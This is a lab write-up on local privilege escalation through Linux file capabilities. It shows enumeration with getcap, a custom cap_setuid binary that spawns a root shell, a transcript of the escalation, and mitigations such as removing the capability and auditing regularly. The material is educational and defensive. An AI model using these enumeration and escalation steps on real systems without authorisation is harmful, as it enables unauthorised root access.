# Privilege Escalation via Linux Capability Abuse (cap_setuid)

## Overview
This exploit demonstrates local privilege escalation through the abuse of Linux file capabilities.  
The target system contains a custom binary (`capbash`) that has been granted the `cap_setuid` capability, allowing it to change its effective user ID without relying on the SUID mechanism.

When executed by an unprivileged user, this binary results in a root shell.

## Discovery Phase
During system enumeration, file capabilities were enumerated using:

```

getcap -r / 2>/dev/null

```

This revealed the following capability-bearing binaries:

```

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep  
/usr/local/bin/capbash cap_setuid=ep

```

## Scope Determination
Only `/usr/local/bin/capbash` was considered within the scope of this lab.

The remaining binaries (`gst-ptp-helper`) possess network-related capabilities (`cap_net_bind_service`, `cap_net_admin`, `cap_sys_nice`) which primarily affect network configuration, timing, and interface behavior. These capabilities do not directly enable local privilege escalation to root under the threat model defined for this lab.

As this project focuses exclusively on **local privilege escalation**, network-related capability abuse is explicitly considered out of scope.

## Root Cause Analysis
Linux capabilities allow fine-grained privilege assignment to binaries.  
The `cap_setuid` capability permits a process to arbitrarily change its user ID, including switching to UID 0 (root).

The `capbash` binary performs the following operations:

- Calls `setuid(0)` to change its effective UID to root
- Executes `/bin/bash` using `execl()`

Because the binary is granted `cap_setuid`, these operations succeed even when executed by an unprivileged user.

## Exploitation
From a low-privileged shell (`dev`), executing the binary results in a root shell:

```

dev@target:~$ /usr/local/bin/capbash  
root@target:~# id  
uid=0(root) gid=1001(dev) groups=1001(dev), 100(users)  
root@target:~# whoami  
root

```

This confirms successful privilege escalation.

## Security Impact
Granting `cap_setuid` to a shell or shell-spawning binary is equivalent to granting full root access.  
This configuration bypasses traditional SUID safeguards and provides attackers with a clean and reliable escalation path.

## Mitigation
Recommended mitigations include:

- Remove unnecessary capabilities from binaries:
```

setcap -r /usr/local/bin/capbash

```
- Avoid assigning `cap_setuid` to user-facing executables
- Prefer privilege separation through service accounts or controlled sudo rules
- Regularly audit file capabilities using `getcap`

## Conclusion
This exploit demonstrates how misconfigured Linux capabilities can provide attackers with direct root access.  
While capabilities are intended to reduce the risks associated with SUID binaries, improper usage can result in equally severe security consequences.
